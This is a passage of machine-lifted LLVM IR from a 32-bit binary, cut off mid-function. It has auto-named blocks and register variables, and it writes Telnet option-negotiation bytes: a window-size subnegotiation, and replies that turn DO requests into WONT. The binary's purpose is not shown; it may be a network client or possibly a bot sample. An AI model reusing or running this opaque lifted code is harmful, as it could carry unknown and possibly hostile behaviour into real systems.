  %v3_804f577 = load i8, i8* %v2_804f577, align 1
  %v4_804f577 = zext i8 %v3_804f577 to i32
  %v5_804f577 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f577 = and i32 %v5_804f577, -256
  %v7_804f577 = or i32 %v6_804f577, %v4_804f577
  store i32 %v7_804f577, i32* %eax.global-to-local, align 4
  %v11_804f57a = icmp eq i8 %v3_804f577, -3
  %v1_804f57c = icmp eq i1 %v11_804f57a, false
  br i1 %v1_804f57c, label %dec_label_pc_804f1b2, label %dec_label_pc_804f582

dec_label_pc_804f582:                             ; preds = %dec_label_pc_804f574, %dec_label_pc_804f1a7
  %v0_804f582 = phi i32 [ %v0_804f577, %dec_label_pc_804f574 ], [ %v0_804f1a7, %dec_label_pc_804f1a7 ]
  %v1_804f582 = add i32 %v0_804f582, 2
  %v2_804f582 = inttoptr i32 %v1_804f582 to i8*
  store i8 -4, i8* %v2_804f582, align 1
  br label %dec_label_pc_804f1ba

dec_label_pc_804f58b:                             ; preds = %dec_label_pc_804f17b
  %v1_804f58b = add i32 %v0_804f58b, 1927
  %v2_804f58b = inttoptr i32 %v1_804f58b to i8*
  store i8 -1, i8* %v2_804f58b, align 1
  %v0_804f593 = load i32, i32* @esp, align 4
  %v1_804f593 = add i32 %v0_804f593, 1928
  %v2_804f593 = inttoptr i32 %v1_804f593 to i8*
  store i8 -5, i8* %v2_804f593, align 1
  %v0_804f59b = load i32, i32* @esp, align 4
  %v1_804f59b = add i32 %v0_804f59b, 1929
  %v2_804f59b = inttoptr i32 %v1_804f59b to i8*
  store i8 31, i8* %v2_804f59b, align 1
  %v0_804f5a3 = load i32, i32* @esp, align 4
  %v1_804f5a3 = add i32 %v0_804f5a3, 1895
  %v2_804f5a3 = inttoptr i32 %v1_804f5a3 to i8*
  store i8 -1, i8* %v2_804f5a3, align 1
  %v0_804f5ab = load i32, i32* @esp, align 4
  %v1_804f5ab = add i32 %v0_804f5ab, 1896
  %v2_804f5ab = inttoptr i32 %v1_804f5ab to i8*
  store i8 -6, i8* %v2_804f5ab, align 1
  %v0_804f5b3 = load i32, i32* @esp, align 4
  %v1_804f5b3 = add i32 %v0_804f5b3, 1897
  %v2_804f5b3 = inttoptr i32 %v1_804f5b3 to i8*
  store i8 31, i8* %v2_804f5b3, align 1
  %v0_804f5bb = load i32, i32* @esp, align 4
  %v1_804f5bb = add i32 %v0_804f5bb, 1898
  %v2_804f5bb = inttoptr i32 %v1_804f5bb to i8*
  store i8 0, i8* %v2_804f5bb, align 1
  %v0_804f5c3 = load i32, i32* @esp, align 4
  %v1_804f5c3 = add i32 %v0_804f5c3, 1899
  %v2_804f5c3 = inttoptr i32 %v1_804f5c3 to i8*
  store i8 80, i8* %v2_804f5c3, align 1
  %v0_804f5cb = load i32, i32* @esp, align 4
  %v1_804f5cb = add i32 %v0_804f5cb, 1900
  %v2_804f5cb = inttoptr i32 %v1_804f5cb to i8*
  store i8 0, i8* %v2_804f5cb, align 1
  %v0_804f5d3 = load i32, i32* @esp, align 4
  %v1_804f5d3 = add i32 %v0_804f5d3, 1901
  %v2_804f5d3 = inttoptr i32 %v1_804f5d3 to i8*
  store i8 24, i8* %v2_804f5d3, align 1
  %v0_804f5db = load i32, i32* @esp, align 4
  %v1_804f5db = add i32 %v0_804f5db, 1902
  %v2_804f5db = inttoptr i32 %v1_804f5db to i8*
  store i8 -1, i8* %v2_804f5db, align 1
  %v0_804f5e3 = load i32, i32* @esp, align 4
  %v1_804f5e3 = add i32 %v0_804f5e3, 1903
  %v2_804f5e3 = inttoptr i32 %v1_804f5e3 to i8*
  store i8 -16, i8* %v2_804f5e3, align 1
  %v0_804f5eb = load i32, i32* @esp, align 4
  %v1_804f5eb = add i32 %v0_804f5eb, 12
  %v2_804f5eb = inttoptr i32 %v1_804f5eb to i32*
  %v3_804f5eb = load i32, i32* %v2_804f5eb, align 4
  store i32 %v3_804f5eb, i32* %eax.global-to-local, align 4
  %v0_804f5ef = load i32, i32* @edi, align 4
  %v1_804f5ef = add i32 %v0_804f5ef, 24
  %v2_804f5ef = inttoptr i32 %v1_804f5ef to i32*
  %v3_804f5ef = load i32, i32* %v2_804f5ef, align 4
  store i32 %v3_804f5ef, i32* %ecx.global-to-local, align 4
  %v0_804f5f2 = load i32, i32* @ebx, align 4
  %v1_804f5f2 = add i32 %v0_804f5f2, 2
  store i32 %v1_804f5f2, i32* %edx.global-to-local, align 4
  %v2_804f5f5 = add i32 %v3_804f5ef, %v3_804f5eb
  store i32 %v2_804f5f5, i32* %eax.global-to-local, align 4
  %tmp820 = icmp ugt i32 %v2_804f5f5, %v1_804f5f2
  br i1 %tmp820, label %dec_label_pc_804f5ff, label %dec_label_pc_804f58b.dec_label_pc_804f1db.loopexit_crit_edge

dec_label_pc_804f58b.dec_label_pc_804f1db.loopexit_crit_edge: ; preds = %dec_label_pc_804f58b
  %v0_804f1db.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f1db

dec_label_pc_804f5ff:                             ; preds = %dec_label_pc_804f58b
  %v2_804f5ff = inttoptr i32 %v1_804f5f2 to i8*
  %v3_804f5ff = load i8, i8* %v2_804f5ff, align 1
  %v12_804f5ff = icmp eq i8 %v3_804f5ff, 31
  br i1 %v12_804f5ff, label %dec_label_pc_804faaf, label %dec_label_pc_804f609

dec_label_pc_804f609:                             ; preds = %dec_label_pc_804f5ff
  %v1_804f609 = inttoptr i32 %v0_804f5f2 to i8*
  %v2_804f609 = load i8, i8* %v1_804f609, align 1
  %v3_804f609 = zext i8 %v2_804f609 to i32
  %v5_804f609 = and i32 %v2_804f5f5, -256
  %v6_804f609 = or i32 %v3_804f609, %v5_804f609
  store i32 %v6_804f609, i32* %eax.global-to-local, align 4
  %v11_804f60b = icmp eq i8 %v2_804f609, -3
  %v1_804f60d = icmp eq i1 %v11_804f60b, false
  br i1 %v1_804f60d, label %dec_label_pc_804fb52, label %dec_label_pc_804f613

dec_label_pc_804f613:                             ; preds = %dec_label_pc_804f609
  store i8 -4, i8* %v1_804f609, align 1
  br label %dec_label_pc_804f195

dec_label_pc_804f61b:                             ; preds = %dec_label_pc_804f0f5
  %v1_804f122 = icmp eq i32 %v0_804f11a, 0
  br i1 %v1_804f122, label %dec_label_pc_804fb0e, label %dec_label_pc_804f621

dec_label_pc_804f621:                             ; preds = %dec_label_pc_804f61b
  %v10_804f621 = icmp eq i32 %v0_804f11a, -1
  %v1_804f624 = icmp eq i1 %v10_804f621, false
  br i1 %v1_804f624, label %dec_label_pc_804f13c, label %dec_label_pc_804f62a

dec_label_pc_804f62a:                             ; preds = %dec_label_pc_804f621
  %v1_804f62a = add i32 %v0_804f11f, 104
  %v2_804f62a = inttoptr i32 %v1_804f62a to i32*
  %v3_804f62a = load i32, i32* %v2_804f62a, align 4
  store i32 %v3_804f62a, i32* %edx.global-to-local, align 4
  %v1_804f62e = inttoptr i32 %v3_804f62a to i32*
  %v2_804f62e = load i32, i32* %v1_804f62e, align 4
  %v11_804f62e = icmp eq i32 %v2_804f62e, 11
  br i1 %v11_804f62e, label %dec_label_pc_804efdb, label %dec_label_pc_804f637

dec_label_pc_804f637:                             ; preds = %dec_label_pc_804f62a, %dec_label_pc_804fb0e
  %v0_804f637 = phi i32 [ %v1_804f11f, %dec_label_pc_804f62a ], [ %v0_804f637.pre, %dec_label_pc_804fb0e ]
  %v0_804f63a = load i32, i32* @edi, align 4
  %v1_804f63a = add i32 %v0_804f63a, 4
  %v2_804f63a = inttoptr i32 %v1_804f63a to i32*
  %v3_804f63a = load i32, i32* %v2_804f63a, align 4
  store i32 %v3_804f63a, i32* @esi, align 4
  %v2_804f63d = add i32 %v0_804f637, -16
  %v3_804f63d = inttoptr i32 %v2_804f63d to i32*
  store i32 %v3_804f63a, i32* %v3_804f63d, align 4
  %v1_804f63e = call i32 @function_8050f63(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f63e, i32* %eax.global-to-local, align 4
  %v0_804f643 = load i32, i32* @edi, align 4
  %v1_804f643 = add i32 %v0_804f643, 284
  %v2_804f643 = inttoptr i32 %v1_804f643 to i8*
  %v3_804f643 = load i8, i8* %v2_804f643, align 1
  %v4_804f643 = zext i8 %v3_804f643 to i32
  %v6_804f643 = and i32 %v1_804f63e, -256
  %v7_804f643 = or i32 %v4_804f643, %v6_804f643
  %v1_804f64c = add i32 %v7_804f643, 1
  store i32 %v1_804f64c, i32* %eax.global-to-local, align 4
  %v1_804f64d = add i32 %v0_804f643, 4
  %v2_804f64d = inttoptr i32 %v1_804f64d to i32*
  store i32 -1, i32* %v2_804f64d, align 4
  %v0_804f654 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f654 = trunc i32 %v0_804f654 to i8
  %v2_804f654 = load i32, i32* @edi, align 4
  %v3_804f654 = add i32 %v2_804f654, 284
  %v4_804f654 = inttoptr i32 %v3_804f654 to i8*
  store i8 %v1_804f654, i8* %v4_804f654, align 1
  %v0_804f65a = load i32, i32* %eax.global-to-local, align 4
  %v1_804f65a = trunc i32 %v0_804f65a to i8
  %tmp821 = icmp ult i8 %v1_804f65a, 10
  %v0_804fb1d = load i32, i32* @edi, align 4
  br i1 %tmp821, label %dec_label_pc_804fb1d, label %dec_label_pc_804f662

dec_label_pc_804f662:                             ; preds = %dec_label_pc_804f637
  %v1_804f662 = add i32 %v0_804fb1d, 284
  %v2_804f662 = inttoptr i32 %v1_804f662 to i8*
  store i8 0, i8* %v2_804f662, align 1
  %v0_804f669 = load i32, i32* @edi, align 4
  %v1_804f669 = add i32 %v0_804f669, 12
  %v2_804f669 = inttoptr i32 %v1_804f669 to i32*
  store i32 0, i32* %v2_804f669, align 4
  br label %dec_label_pc_804efdb

dec_label_pc_804f675:                             ; preds = %dec_label_pc_804f0e1
  %v0_804f675 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804f675, i32* %edx.global-to-local, align 4
  %v1_804f677 = load i32, i32* @esp, align 4
  %v2_804f677 = add i32 %v1_804f677, -4
  %v3_804f677 = inttoptr i32 %v2_804f677 to i32*
  store i32 %v0_804f675, i32* %v3_804f677, align 4
  %v0_804f678 = load i32, i32* @edi, align 4
  %v1_804f678 = add i32 %v0_804f678, 92
  store i32 %v1_804f678, i32* %eax.global-to-local, align 4
  %v1_804f67b = add i32 %v1_804f677, -8
  %v2_804f67b = inttoptr i32 %v1_804f67b to i32*
  store i32 192, i32* %v2_804f67b, align 4
  %v0_804f680 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f680 = add i32 %v1_804f677, -12
  %v3_804f680 = inttoptr i32 %v2_804f680 to i32*
  store i32 %v0_804f680, i32* %v3_804f680, align 4
  %v0_804f681 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f681 = add i32 %v1_804f677, -16
  %v3_804f681 = inttoptr i32 %v2_804f681 to i32*
  store i32 %v0_804f681, i32* %v3_804f681, align 4
  %v4_804f682 = call i32 @function_80514c5(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f682, i32* %eax.global-to-local, align 4
  %v0_804f687 = load i32, i32* @edi, align 4
  %v1_804f687 = add i32 %v0_804f687, 24
  %v2_804f687 = inttoptr i32 %v1_804f687 to i32*
  %v3_804f687 = load i32, i32* %v2_804f687, align 4
  %v1_804f68a = add i32 %v3_804f687, -64
  store i32 %v1_804f68a, i32* %eax.global-to-local, align 4
  store i32 %v1_804f68a, i32* %v2_804f687, align 4
  br label %dec_label_pc_804f0f5

dec_label_pc_804f698:                             ; preds = %dec_label_pc_804f195
  store i8 -3, i8* %v1_804f195, align 1
  %v5_804f1a7.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f1a7

dec_label_pc_804f6a0:                             ; preds = %dec_label_pc_804f1b2
  %v1_804f6a0 = add i32 %v0_804f6a0, 2
  %v2_804f6a0 = inttoptr i32 %v1_804f6a0 to i8*
  store i8 -3, i8* %v2_804f6a0, align 1
  br label %dec_label_pc_804f1ba

dec_label_pc_804f6a9:                             ; preds = %dec_label_pc_804f43f, %dec_label_pc_804f43f, %dec_label_pc_804f43f, %dec_label_pc_804f43f, %dec_label_pc_804f43f
  %v1_804f6a9 = add i32 %v0_804f6a9, 1
  store i32 %v1_804f6a9, i32* @ebp, align 4
  %v10_804f6ac = icmp eq i32 %v0_804f6a9, -2
  br i1 %v10_804f6ac, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f6b5

dec_label_pc_804f6b5:                             ; preds = %dec_label_pc_804f6a9
  %tmp183 = icmp slt i32 %v1_804f6a9, 1
  br i1 %tmp183, label %dec_label_pc_804f56b, label %dec_label_pc_804f6bd

dec_label_pc_804f6bd:                             ; preds = %dec_label_pc_804f6b5
  %v0_804f6bd = load i32, i32* @esp, align 4
  %v1_804f6c0 = add i32 %v0_804f6bd, -16
  %v2_804f6c0 = inttoptr i32 %v1_804f6c0 to i32*
  store i32 7, i32* %v2_804f6c0, align 4
  %v0_804f6c2 = call i32 @function_8050470()
  store i32 %v0_804f6c2, i32* %eax.global-to-local, align 4
  %v0_804f6c7 = load i32, i32* @esp, align 4
  %v1_804f6c7 = inttoptr i32 %v0_804f6c7 to i32*
  %v2_804f6c7 = load i32, i32* %v1_804f6c7, align 4
  store i32 %v2_804f6c7, i32* %eax.global-to-local, align 4
  %v3_804f6c7 = add i32 %v0_804f6c7, 4
  %v1_804f6c8 = inttoptr i32 %v3_804f6c7 to i32*
  %v1_804f6c9 = add i32 %v0_804f6c7, 1928
  store i32 %v1_804f6c9, i32* %edx.global-to-local, align 4
  store i32 %v1_804f6c9, i32* %v1_804f6c8, align 4
  store i32 7, i32* %v1_804f6c7, align 4
  %v0_804f6d3 = call i32 @function_80503c0()
  store i32 %v0_804f6d3, i32* %eax.global-to-local, align 4
  %v0_804f6d8 = load i32, i32* @esp, align 4
  %v1_804f6d8 = add i32 %v0_804f6d8, -4
  %v2_804f6d8 = inttoptr i32 %v1_804f6d8 to i32*
  store i32 16384, i32* %v2_804f6d8, align 4
  %v1_804f6dd = add i32 %v0_804f6d8, 1928
  %v2_804f6dd = inttoptr i32 %v1_804f6dd to i32*
  %v3_804f6dd = load i32, i32* %v2_804f6dd, align 4
  store i32 %v3_804f6dd, i32* @esi, align 4
  %v2_804f6e4 = add i32 %v0_804f6d8, -8
  %v3_804f6e4 = inttoptr i32 %v2_804f6e4 to i32*
  store i32 %v3_804f6dd, i32* %v3_804f6e4, align 4
  %v2_804f6e5 = add i32 %v0_804f6d8, -12
  %v3_804f6e5 = inttoptr i32 %v2_804f6e5 to i32*
  store i32 %v0_804f6d3, i32* %v3_804f6e5, align 4
  %v0_804f6e6 = load i32, i32* @edi, align 4
  %v1_804f6e6 = add i32 %v0_804f6e6, 4
  %v2_804f6e6 = inttoptr i32 %v1_804f6e6 to i32*
  %v3_804f6e6 = load i32, i32* %v2_804f6e6, align 4
  store i32 %v3_804f6e6, i32* @ebx, align 4
  %v2_804f6e9 = add i32 %v0_804f6d8, -16
  %v3_804f6e9 = inttoptr i32 %v2_804f6e9 to i32*
  store i32 %v3_804f6e6, i32* %v3_804f6e9, align 4
  %v0_804f6ea = call i32 @function_8051696()
  store i32 %v0_804f6ea, i32* %eax.global-to-local, align 4
  %v0_804f6ef = load i32, i32* @esp, align 4
  %v1_804f6f2 = add i32 %v0_804f6ef, 28
  %v2_804f6f2 = inttoptr i32 %v1_804f6f2 to i32*
  store i32 16384, i32* %v2_804f6f2, align 4
  %v1_804f6f7 = add i32 %v0_804f6ef, 24
  %v2_804f6f7 = inttoptr i32 %v1_804f6f7 to i32*
  store i32 2, i32* %v2_804f6f7, align 4
  %v1_804f6f9 = add i32 %v0_804f6ef, 20
  %v2_804f6f9 = inttoptr i32 %v1_804f6f9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80538ed.25 to i32), i32* %v2_804f6f9, align 4
  %v0_804f6fe = load i32, i32* @edi, align 4
  %v1_804f6fe = add i32 %v0_804f6fe, 4
  %v2_804f6fe = inttoptr i32 %v1_804f6fe to i32*
  %v3_804f6fe = load i32, i32* %v2_804f6fe, align 4
  store i32 %v3_804f6fe, i32* %ecx.global-to-local, align 4
  %v2_804f701 = add i32 %v0_804f6ef, 16
  %v3_804f701 = inttoptr i32 %v2_804f701 to i32*
  store i32 %v3_804f6fe, i32* %v3_804f701, align 4
  %v0_804f702 = call i32 @function_8051696()
  store i32 %v0_804f702, i32* %eax.global-to-local, align 4
  %v0_804f707 = load i32, i32* @esp, align 4
  %v1_804f707 = inttoptr i32 %v0_804f707 to i32*
  store i32 7, i32* %v1_804f707, align 4
  %v0_804f70e = call i32 @function_80503f0()
  store i32 %v0_804f70e, i32* %eax.global-to-local, align 4
  %v0_804f716 = load i32, i32* @edi, align 4
  %v1_804f716 = add i32 %v0_804f716, 12
  %v2_804f716 = inttoptr i32 %v1_804f716 to i32*
  store i32 9, i32* %v2_804f716, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804f722:                             ; preds = %dec_label_pc_804f3fa, %dec_label_pc_804f3fa, %dec_label_pc_804f3fa, %dec_label_pc_804f3fa, %dec_label_pc_804f3fa
  %v1_804f722 = add i32 %v0_804f722, 1
  store i32 %v1_804f722, i32* @ebp, align 4
  %v10_804f725 = icmp eq i32 %v0_804f722, -2
  br i1 %v10_804f725, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f72e

dec_label_pc_804f72e:                             ; preds = %dec_label_pc_804f722
  %tmp184 = icmp slt i32 %v1_804f722, 1
  br i1 %tmp184, label %dec_label_pc_804f56b, label %dec_label_pc_804f736

dec_label_pc_804f736:                             ; preds = %dec_label_pc_804f72e
  %v0_804f736 = load i32, i32* @esp, align 4
  %v1_804f739 = add i32 %v0_804f736, -16
  %v2_804f739 = inttoptr i32 %v1_804f739 to i32*
  store i32 8, i32* %v2_804f739, align 4
  %v0_804f73b = call i32 @function_8050470()
  store i32 %v0_804f73b, i32* %eax.global-to-local, align 4
  %v0_804f740 = load i32, i32* @esp, align 4
  %v1_804f740 = inttoptr i32 %v0_804f740 to i32*
  %v2_804f740 = load i32, i32* %v1_804f740, align 4
  store i32 %v2_804f740, i32* %eax.global-to-local, align 4
  %v3_804f740 = add i32 %v0_804f740, 4
  %v1_804f741 = inttoptr i32 %v3_804f740 to i32*
  %v2_804f741 = load i32, i32* %v1_804f741, align 4
  store i32 %v2_804f741, i32* %edx.global-to-local, align 4
  %v1_804f742 = add i32 %v0_804f740, 1928
  store i32 %v1_804f742, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f742, i32* %v1_804f741, align 4
  store i32 8, i32* %v1_804f740, align 4
  %v0_804f74c = call i32 @function_80503c0()
  store i32 %v0_804f74c, i32* %eax.global-to-local, align 4
  %v0_804f751 = load i32, i32* @esp, align 4
  %v1_804f751 = add i32 %v0_804f751, -4
  %v2_804f751 = inttoptr i32 %v1_804f751 to i32*
  store i32 16384, i32* %v2_804f751, align 4
  %v1_804f756 = add i32 %v0_804f751, 1928
  %v2_804f756 = inttoptr i32 %v1_804f756 to i32*
  %v3_804f756 = load i32, i32* %v2_804f756, align 4
  store i32 %v3_804f756, i32* @esi, align 4
  %v2_804f75d = add i32 %v0_804f751, -8
  %v3_804f75d = inttoptr i32 %v2_804f75d to i32*
  store i32 %v3_804f756, i32* %v3_804f75d, align 4
  %v2_804f75e = add i32 %v0_804f751, -12
  %v3_804f75e = inttoptr i32 %v2_804f75e to i32*
  store i32 %v0_804f74c, i32* %v3_804f75e, align 4
  %v0_804f75f = load i32, i32* @edi, align 4
  %v1_804f75f = add i32 %v0_804f75f, 4
  %v2_804f75f = inttoptr i32 %v1_804f75f to i32*
  %v3_804f75f = load i32, i32* %v2_804f75f, align 4
  store i32 %v3_804f75f, i32* @ebx, align 4
  %v2_804f762 = add i32 %v0_804f751, -16
  %v3_804f762 = inttoptr i32 %v2_804f762 to i32*
  store i32 %v3_804f75f, i32* %v3_804f762, align 4
  %v0_804f763 = call i32 @function_8051696()
  store i32 %v0_804f763, i32* %eax.global-to-local, align 4
  %v0_804f768 = load i32, i32* @esp, align 4
  %v1_804f76b = add i32 %v0_804f768, 28
  %v2_804f76b = inttoptr i32 %v1_804f76b to i32*
  store i32 16384, i32* %v2_804f76b, align 4
  %v1_804f770 = add i32 %v0_804f768, 24
  %v2_804f770 = inttoptr i32 %v1_804f770 to i32*
  store i32 2, i32* %v2_804f770, align 4
  %v1_804f772 = add i32 %v0_804f768, 20
  %v2_804f772 = inttoptr i32 %v1_804f772 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80538ed.25 to i32), i32* %v2_804f772, align 4
  %v0_804f777 = load i32, i32* @edi, align 4
  %v1_804f777 = add i32 %v0_804f777, 4
  %v2_804f777 = inttoptr i32 %v1_804f777 to i32*
  %v3_804f777 = load i32, i32* %v2_804f777, align 4
  store i32 %v3_804f777, i32* %ecx.global-to-local, align 4
  %v2_804f77a = add i32 %v0_804f768, 16
  %v3_804f77a = inttoptr i32 %v2_804f77a to i32*
  store i32 %v3_804f777, i32* %v3_804f77a, align 4
  %v0_804f77b = call i32 @function_8051696()
  store i32 %v0_804f77b, i32* %eax.global-to-local, align 4
  %v0_804f780 = load i32, i32* @esp, align 4
  %v1_804f780 = inttoptr i32 %v0_804f780 to i32*
  store i32 8, i32* %v1_804f780, align 4
  %v0_804f787 = call i32 @function_80503f0()
  store i32 %v0_804f787, i32* %eax.global-to-local, align 4
  %v0_804f78f = load i32, i32* @edi, align 4
  %v1_804f78f = add i32 %v0_804f78f, 12
  %v2_804f78f = inttoptr i32 %v1_804f78f to i32*
  store i32 10, i32* %v2_804f78f, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804f79b:                             ; preds = %dec_label_pc_804f530, %dec_label_pc_804f530, %dec_label_pc_804f530, %dec_label_pc_804f530
  %v1_804f79b = add i32 %v0_804f79b, 1
  store i32 %v1_804f79b, i32* @ebp, align 4
  %v10_804f79e = icmp eq i32 %v0_804f79b, -2
  %v1_804f7a1 = icmp eq i1 %v10_804f79e, false
  br i1 %v1_804f7a1, label %dec_label_pc_804f9e7, label %dec_label_pc_804f7a7

dec_label_pc_804f7a7:                             ; preds = %dec_label_pc_804f558, %dec_label_pc_804f79b, %dec_label_pc_804f524
  %v0_804f7a7 = load i32, i32* @esp, align 4
  %v1_804f7aa = add i32 %v0_804f7a7, -16
  %v2_804f7aa = inttoptr i32 %v1_804f7aa to i32*
  store i32 25, i32* %v2_804f7aa, align 4
  %v0_804f7ac = call i32 @function_8050470()
  store i32 %v0_804f7ac, i32* %eax.global-to-local, align 4
  %v0_804f7b1 = load i32, i32* @esp, align 4
  %v1_804f7b1 = inttoptr i32 %v0_804f7b1 to i32*
  %v2_804f7b1 = load i32, i32* %v1_804f7b1, align 4
  store i32 %v2_804f7b1, i32* %eax.global-to-local, align 4
  %v3_804f7b1 = add i32 %v0_804f7b1, 4
  %v1_804f7b2 = inttoptr i32 %v3_804f7b1 to i32*
  %v2_804f7b2 = load i32, i32* %v1_804f7b2, align 4
  store i32 %v2_804f7b2, i32* %edx.global-to-local, align 4
  %v1_804f7b3 = add i32 %v0_804f7b1, 1928
  store i32 %v1_804f7b3, i32* %eax.global-to-local, align 4
  store i32 %v1_804f7b3, i32* %v1_804f7b2, align 4
  store i32 25, i32* %v1_804f7b1, align 4
  %v0_804f7bd = call i32 @function_80503c0()
  store i32 %v0_804f7bd, i32* %eax.global-to-local, align 4
  %v0_804f7c2 = load i32, i32* @esp, align 4
  %v1_804f7c2 = add i32 %v0_804f7c2, 1928
  %v2_804f7c2 = inttoptr i32 %v1_804f7c2 to i32*
  %v3_804f7c2 = load i32, i32* %v2_804f7c2, align 4
  %v1_804f7c9 = add i32 %v3_804f7c2, -1
  store i32 %v1_804f7c9, i32* %edx.global-to-local, align 4
  %v2_804f7ca = add i32 %v0_804f7c2, -4
  %v3_804f7ca = inttoptr i32 %v2_804f7ca to i32*
  store i32 %v1_804f7c9, i32* %v3_804f7ca, align 4
  %v2_804f7cb = add i32 %v0_804f7c2, -8
  %v3_804f7cb = inttoptr i32 %v2_804f7cb to i32*
  store i32 %v0_804f7bd, i32* %v3_804f7cb, align 4
  %v0_804f7cc = load i32, i32* @edi, align 4
  %v1_804f7cc = add i32 %v0_804f7cc, 24
  %v2_804f7cc = inttoptr i32 %v1_804f7cc to i32*
  %v3_804f7cc = load i32, i32* %v2_804f7cc, align 4
  store i32 %v3_804f7cc, i32* %eax.global-to-local, align 4
  %v2_804f7cf = add i32 %v0_804f7c2, -12
  %v3_804f7cf = inttoptr i32 %v2_804f7cf to i32*
  store i32 %v3_804f7cc, i32* %v3_804f7cf, align 4
  %v1_804f7d0 = add i32 %v0_804f7c2, 28
  %v2_804f7d0 = inttoptr i32 %v1_804f7d0 to i32*
  %v3_804f7d0 = load i32, i32* %v2_804f7d0, align 4
  %v2_804f7d4 = add i32 %v0_804f7c2, -16
  %v3_804f7d4 = inttoptr i32 %v2_804f7d4 to i32*
  store i32 %v3_804f7d0, i32* %v3_804f7d4, align 4
  %v0_804f7d5 = call i32 @function_8050af0()
  %v0_804f7da = load i32, i32* @esp, align 4
  %v8_804f7dd = icmp eq i32 %v0_804f7d5, -1
  %v1_804f7de = icmp eq i1 %v8_804f7dd, false
  %v2_804f7de = zext i1 %v1_804f7de to i32
  %v2_804f7e1 = icmp eq i1 %v1_804f7de, false
  store i32 %v2_804f7de, i32* %eax.global-to-local, align 4
  store i32 %v2_804f7de, i32* @ebp, align 4
  %v1_804f0cc = add i32 %v0_804f7da, 16
  %v2_804f0cc = inttoptr i32 %v1_804f0cc to i32*
  store i32 25, i32* %v2_804f0cc, align 4
  %v0_804f0ce = call i32 @function_80503f0()
  store i32 %v0_804f0ce, i32* %eax.global-to-local, align 4
  br i1 %v2_804f7e1, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f7f0

dec_label_pc_804f7f0:                             ; preds = %dec_label_pc_804f7a7
  %v0_804f7fd = load i32, i32* @ebp, align 4
  %v10_804f7fd = icmp eq i32 %v0_804f7fd, -1
  br i1 %v10_804f7fd, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f806

dec_label_pc_804f806:                             ; preds = %dec_label_pc_804f7f0, %dec_label_pc_804f9e7
  %v0_804f806 = phi i32 [ %v0_804f7fd, %dec_label_pc_804f7f0 ], [ %v0_804f806.pre, %dec_label_pc_804f9e7 ]
  %v0_804f812.in = load i32, i32* @esp, align 4
  %tmp185 = icmp slt i32 %v0_804f806, 1
  br i1 %tmp185, label %dec_label_pc_804f56b, label %dec_label_pc_804f80e

dec_label_pc_804f80e:                             ; preds = %dec_label_pc_804f806
  %v0_804f80e = load i32, i32* @edi, align 4
  %v1_804f80e = inttoptr i32 %v0_804f80e to i32*
  %v2_804f80e = load i32, i32* %v1_804f80e, align 4
  store i32 %v2_804f80e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f812 = add i32 %v0_804f812.in, 12
  %v2_804f812 = inttoptr i32 %v1_804f812 to i32*
  store i32 16384, i32* %v2_804f812, align 4
  %v0_804f817 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f817 = add i32 %v0_804f817, 13
  %v2_804f817 = inttoptr i32 %v1_804f817 to i8*
  %v3_804f817 = load i8, i8* %v2_804f817, align 1
  %v4_804f817 = zext i8 %v3_804f817 to i32
  %v5_804f817 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f817 = and i32 %v5_804f817, -256
  %v7_804f817 = or i32 %v6_804f817, %v4_804f817
  store i32 %v7_804f817, i32* %eax.global-to-local, align 4
  %v2_804f81a = add i32 %v0_804f812.in, 8
  %v3_804f81a = inttoptr i32 %v2_804f81a to i32*
  store i32 %v7_804f817, i32* %v3_804f81a, align 4
  %v0_804f81b = load i32, i32* %edx.global-to-local, align 4
  %v1_804f81b = add i32 %v0_804f81b, 4
  %v2_804f81b = inttoptr i32 %v1_804f81b to i32*
  %v3_804f81b = load i32, i32* %v2_804f81b, align 4
  store i32 %v3_804f81b, i32* @esi, align 4
  %v2_804f81e = add i32 %v0_804f812.in, 4
  %v3_804f81e = inttoptr i32 %v2_804f81e to i32*
  store i32 %v3_804f81b, i32* %v3_804f81e, align 4
  %v0_804f81f = load i32, i32* @edi, align 4
  %v1_804f81f = add i32 %v0_804f81f, 4
  %v2_804f81f = inttoptr i32 %v1_804f81f to i32*
  %v3_804f81f = load i32, i32* %v2_804f81f, align 4
  store i32 %v3_804f81f, i32* @ebx, align 4
  %v3_804f822 = inttoptr i32 %v0_804f812.in to i32*
  store i32 %v3_804f81f, i32* %v3_804f822, align 4
  %v0_804f823 = call i32 @function_8051696()
  store i32 %v0_804f823, i32* %eax.global-to-local, align 4
  %v0_804f828 = load i32, i32* @esp, align 4
  %v1_804f828 = add i32 %v0_804f828, -4
  %v2_804f828 = inttoptr i32 %v1_804f828 to i32*
  store i32 16384, i32* %v2_804f828, align 4
  %v1_804f82d = add i32 %v0_804f828, -8
  %v2_804f82d = inttoptr i32 %v1_804f82d to i32*
  store i32 2, i32* %v2_804f82d, align 4
  %v1_804f82f = add i32 %v0_804f828, -12
  %v2_804f82f = inttoptr i32 %v1_804f82f to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80538ed.25 to i32), i32* %v2_804f82f, align 4
  %v0_804f834 = load i32, i32* @edi, align 4
  %v1_804f834 = add i32 %v0_804f834, 4
  %v2_804f834 = inttoptr i32 %v1_804f834 to i32*
  %v3_804f834 = load i32, i32* %v2_804f834, align 4
  store i32 %v3_804f834, i32* %ecx.global-to-local, align 4
  %v2_804f837 = add i32 %v0_804f828, -16
